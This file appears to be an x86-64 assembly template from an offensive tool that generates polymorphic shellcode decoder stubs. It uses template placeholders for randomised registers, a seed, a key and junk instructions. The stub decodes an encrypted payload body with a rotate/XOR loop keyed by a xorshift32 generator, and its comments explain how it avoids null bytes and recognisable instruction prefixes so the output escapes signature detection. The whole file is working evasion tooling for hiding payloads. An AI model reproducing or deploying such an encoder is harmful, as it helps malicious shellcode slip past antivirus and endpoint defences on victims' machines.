.code64

// NOT use registers like r8, r9 for prevent
// appear a lot of instruction prefix about 0x48

// the ret and next labels are used to prevent
// "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
// about call or jmp instructions

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// rax store the random seed
// rbx store the crypto key
// rcx store the loop times
// rdx store the xor shift median
// rsi store the body address
// rdi store the current value

header:
  // save context
  push {{.Reg.rax}}                            {{iji}}
  push {{.Reg.rbx}}                            {{iji}}
  push {{.Reg.rcx}}                            {{iji}}
  push {{.Reg.rdx}}                            {{iji}}
  push {{.Reg.rsi}}                            {{iji}}
  push {{.Reg.rdi}}                            {{iji}}
  pushfq                                       {{iji}}

  mov {{.Reg.eax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{iji}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // calculate the body address
  lea {{.Reg.rsi}}, [rip + body + {{hex .OffsetT}}]   {{iji}}
  add {{.Reg.rsi}}, {{hex .OffsetA}}                  {{iji}}
  sub {{.Reg.rsi}}, {{hex .OffsetS}}                  {{iji}}

  // decode shellcode body
 loop_xor:
  mov {{.Reg.edi}}, [{{.Reg.rsi}}]             {{ijs}}
  ror {{.Reg.edi}}, 17                         {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{ijs}}
  rol {{.Reg.edi}}, 7                          {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{ijs}}
  mov [{{.Reg.rsi}}], {{.Reg.edi}}             {{ijs}}

  // call xor shift 32
  jmp xor_shift_32                             {{ijs}}
 ret_1:

  // update address and counter
  add {{.Reg.rsi}}, 4                          {{ijs}}
  dec {{.Reg.ecx}}                             {{ijs}}
  jnz loop_xor                                 {{ijs}}

  // jump to the loader or shellcode
  jmp restore                                  {{ijs}}

xor_shift_32:
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  shl {{.Reg.edx}}, 13                         {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  shr {{.Reg.edx}}, 17                         {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  shl {{.Reg.edx}}, 5                          {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}
  jmp ret_1                                    {{ijs}}

restore:
  // restore context
  popfq                                        {{iji}}
  pop {{.Reg.rdi}}                             {{iji}}
  pop {{.Reg.rsi}}                             {{iji}}
  pop {{.Reg.rdx}}                             {{iji}}
  pop {{.Reg.rcx}}                             {{iji}}
  pop {{.Reg.rbx}}                             {{iji}}
  pop {{.Reg.rax}}                             {{iji}}

body:
